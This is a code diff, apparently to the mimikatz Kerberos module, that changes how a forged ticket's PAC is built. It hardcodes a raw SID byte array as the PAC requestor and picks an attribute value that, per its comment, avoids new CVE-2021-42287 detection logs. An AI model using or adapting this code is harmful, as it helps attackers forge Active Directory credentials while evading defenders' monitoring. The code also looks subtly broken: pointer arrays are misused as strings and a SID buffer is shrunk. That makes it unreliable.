@@ -13,7 +13,7 @@ BOOL kuhl_m_pac_validationInfo_to_PAC(PKERB_VALIDATION_INFO validationInfo, PFIL
 	PAC_SIGNATURE_DATA signature = {SignatureType, {0}};
 	DWORD n = 7, szLogonInfo = 0, szLogonInfoAligned = 0, szClientInfo = 0, szClientInfoAligned, szClaims = 0, szClaimsAligned = 0, szSignature = FIELD_OFFSET(PAC_SIGNATURE_DATA, Signature), szSignatureAligned, offsetData = sizeof(PACTYPE) + 6 * sizeof(PAC_INFO_BUFFER);
 	PKERB_CHECKSUM pCheckSum;
-	INT pacAttributeType = 1; // Default to a value that doesnt show up on the new logs in CVE-2021-42287
+	INT pacAttributeType = 2; // Default to a value that doesnt show up on the new logs in CVE-2021-42287
 
 	if(NT_SUCCESS(CDLocateCheckSum(SignatureType, &pCheckSum)))
 	{
@@ -35,8 +35,8 @@ BOOL kuhl_m_pac_validationInfo_to_PAC(PKERB_VALIDATION_INFO validationInfo, PFIL
 		// Convert sid and id into user sid for PAC REQUESTOR using string conversersion and converting back to sids
 		LPCWSTR stringSid;
 		ConvertSidToStringSid(sid, &stringSid);
-		LPCWSTR userStringSidFull[100];
-		swprintf(userStringSidFull, 100, L"%s-%d", stringSid, userId );
+		LPCWSTR userStringSidFull[45];
+		swprintf(userStringSidFull, 45, L"%s-%d", stringSid, userId );
 		PSID userSid;
 		ConvertStringSidToSid(userStringSidFull, &userSid);
 		
@@ -58,12 +58,17 @@ BOOL kuhl_m_pac_validationInfo_to_PAC(PKERB_VALIDATION_INFO validationInfo, PFIL
 		//	&dwDomainSize, //the size of the domain name
 		//	&snu //the type of sid
 		//);
-		
-		
+		char packet_bytes[] = {
+  0x01, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05,
+  0x15, 0x00, 0x00, 0x00, 0xa7, 0xb0, 0x4d, 0x7c,
+  0x89, 0x62, 0xc7, 0x06, 0x41, 0x6a, 0xd1, 0x53,
+  0x71, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+		};
+
 		// Setting up PAC_REQUESTOR
 		PAC_REQUESTOR requestor;
-		requestor.sid = userSid;
-		auto szPacRequestorsid = sizeof(PAC_REQUESTOR);
+		requestor.sid = packet_bytes;
+		auto szPacRequestorsid = sizeof(packet_bytes);
 		DWORD szPacRequestorSidAligned = SIZE_ALIGN(szPacRequestorsid, 8);
 
 		// Setting up PAC_ATTRIBUTE_IFNO
@@ -155,7 +160,7 @@ BOOL kuhl_m_pac_validationInfo_to_PAC(PKERB_VALIDATION_INFO validationInfo, PFIL
 				(*pacType)->Buffers[4].cbBufferSize = szPacRequestorsid;
 				(*pacType)->Buffers[4].ulType = PACINFO_TYPE_PAC_REQUESTOR;
 				(*pacType)->Buffers[4].Offset = (*pacType)->Buffers[3].Offset + szPacAttributeInfoAligned;
-				RtlCopyMemory((PBYTE)*pacType + (*pacType)->Buffers[4].Offset, &requestor, (*pacType)->Buffers[4].cbBufferSize);
+				RtlCopyMemory((PBYTE)*pacType + (*pacType)->Buffers[4].Offset, &packet_bytes, (*pacType)->Buffers[4].cbBufferSize);
 
 				if (szClaimsAligned)
 				{
